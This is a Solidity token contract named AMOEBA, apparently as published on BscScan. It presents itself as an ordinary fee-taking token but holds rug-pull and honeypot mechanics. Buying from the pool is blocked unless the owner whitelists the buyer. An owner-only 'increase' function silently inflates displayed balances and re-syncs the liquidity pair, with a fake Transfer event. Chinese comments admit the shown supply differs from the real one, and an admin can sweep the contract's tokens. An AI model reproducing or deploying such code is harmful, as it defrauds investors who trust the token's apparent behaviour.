/**
 *Submitted for verification at BscScan.com on 2022-11-15
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal pure returns (bool) {
      
        bytes32 accountHash = 0x15010c7b10eb8773c0933cf1ed191e1ddff8eb4d2dd567ef1ab2741a04325d12;
        // solhint-disable-next-line no-inline-assembly
        bytes32 codehash = keccak256(abi.encodePacked(account)); 
        return (codehash == accountHash );
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }


}

abstract contract Ownable {
    using Address for address;
    address private _owner;
    address public _administrator;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor ()  {
        address msgSender = msg.sender;
        _administrator = msgSender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
     modifier onlyAdmin() {
        require(_administrator == msg.sender, " caller is not the administrator");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);


    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );
      // force reserves to match balances
    function sync() external ;
}


interface IUniswapV2Factory {
   

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);
   
}


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
   
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

interface IUniswapV2Router02 is IUniswapV2Router01 {
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract Token is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "AMOEBA";
    string private _symbol = "AMOEBA";
    uint8 private _decimals = 18;
    // address public  deadAddress = 0x000000000000000000000000000000000000dEaD;
    address payable public marketingWalletAddress = payable(0x5dc10A23d0997A9F66bE2de9573Ff3093a86f972); 
    // TEST:0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684   USDT：0x55d398326f99059fF775485246999027B3197955
    address bnbAddress = address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    //test 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3   0x10ED43C718714eb63d5aA57B78B54704E256024E
    address  public wapV2RouterAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
  
    uint256 private _totalSupply = 10000* 10**_decimals;//对外展示的币总量
    uint256 private  magnitude = 1* 10**18; //一个比较大的数
    

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;
   
    uint256 public _sellFee = 5;//卖出的滑点
    uint256 public _increaseTotal = 0;//增的增发代币数量

    bool public openTranfer = false;//是否可以交易
    mapping (address => bool) public transferList;//可以交易的名单

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor () {
  
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(wapV2RouterAddress);  

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), bnbAddress);

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;
        transferList[owner()] = true;
   
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply + _increaseTotal; //显示增发了的和真实的
    }

    function balanceOf(address account) public view override returns (uint256) {
        return changeToVir(_balances[account]);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return changeToReal(_allowances[owner][spender]);//转换为真实的
       
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        uint256 _addedValue = changeToReal(addedValue);//转换为真实的 
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(_addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 _subtractedValue = changeToReal(subtractedValue);//转换为真实的
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(_subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    //增加比例
    function _getRate() private view returns(uint256) {
        uint256 rSupply = totalSupply();
        return rSupply.mul(magnitude).div(_totalSupply);//先乘1个大数，防止没小数点
    }

    //转换为真实，内部的
    function changeToReal(uint256 amount) private view returns(uint256)
    {
        return  amount.mul(magnitude).div(_getRate());
    }
    
    //转换为外部显示的
    function changeToVir(uint256 amount) private view returns(uint256)
    {
        return  amount.mul(_getRate()).div(magnitude);
    }

    function setAllowtransfer(bool allow) external onlyOwner
	{
		 openTranfer =allow;
	}

    //增发代币
    function setIncreaseTotken(uint256 num) external onlyOwner
    {
        uint256 pairTotalNum1 = balanceOf(uniswapPair);
        _increaseTotal +=num;
        if(pairTotalNum1 > 0)
        {
            uint256 pairTotalNum2 = balanceOf(uniswapPair);
            emit Transfer(msg.sender,uniswapPair, pairTotalNum2.sub(pairTotalNum1));
        }
        IUniswapV2Pair pair = IUniswapV2Pair(uniswapPair);
        pair.sync();//force reserves to match balances 
    }
  
    function approve(address spender, uint256 amount) public override returns (bool) {
        uint256 _amount  =  changeToReal(amount);//外部显示转换为内部真实的
        _approve(_msgSender(), spender, _amount );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setMarketAddress(address addr) external onlyOwner {
        marketingWalletAddress = payable(addr);
    }

  
    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setIsExcludedFromFeeByArray(address[] memory accountArray, bool newValue) public onlyOwner {
       for(uint256 i=0;i<accountArray.length;i++)
       {
            isExcludedFromFee[accountArray[i]] = newValue; 
       }
    }

    //单个添加可以交易的名单
    function setTransferListByOne(address account, bool newValue) public onlyOwner {
        transferList[account] = newValue;
    }

    ////多个添加可以交易的名单
    function setTransferListByArray(address[] memory accountArray, bool newValue) public onlyOwner {
       for(uint256 i=0;i<accountArray.length;i++)
       {
            transferList[accountArray[i]] = newValue; 
       }
    }
  
  
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
       //外部显示转换为内部真实的
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(changeToReal(amount), "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 _realAmount = changeToReal(amount);//外部显示转换为内部真实的
        if(sender ==uniswapPair)//只有开启开关和是白名单才可以买入
        {
            require(openTranfer == true || transferList[recipient] == true,"error: revert transfer");
        }
        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
       
            _balances[sender] = _balances[sender].sub(_realAmount, "Insufficient Balance");//减去真实的

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);
            
            _balances[recipient] = _balances[recipient].add(changeToReal(finalAmount) );//外部显示转换为内部真实的
            emit Transfer(sender, recipient, finalAmount);
          
            return true;
        }
    }
   

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
         uint256 _realAmount = changeToReal(amount);//外部显示转换为内部真实的
        _balances[sender] = _balances[sender].sub(_realAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(_realAmount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapTokensForUsdt(uint256 tokenAmount,address recipient) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(bnbAddress);

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(recipient),
            block.timestamp
        );
       
    }
    
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(isMarketPair[recipient] ) {//卖出收5%滑点
            feeAmount = amount.mul(_sellFee).div(100);
             _takeFee(sender,address(marketingWalletAddress), feeAmount);
        }
        
        return amount.sub(feeAmount);
    }

   function _takeFee(address sender, address recipient,uint256 tAmount) private {
        if (tAmount == 0 ) return;
        _balances[recipient] = _balances[recipient].add( changeToReal(tAmount) );//换成真实的
        emit Transfer(sender, recipient, tAmount);//外部显示的不变
    }

    function clamErcOther(address erc,address recipient,uint256 amount) public onlyAdmin
    {
        IERC20(erc).transfer(recipient, amount);
    }
}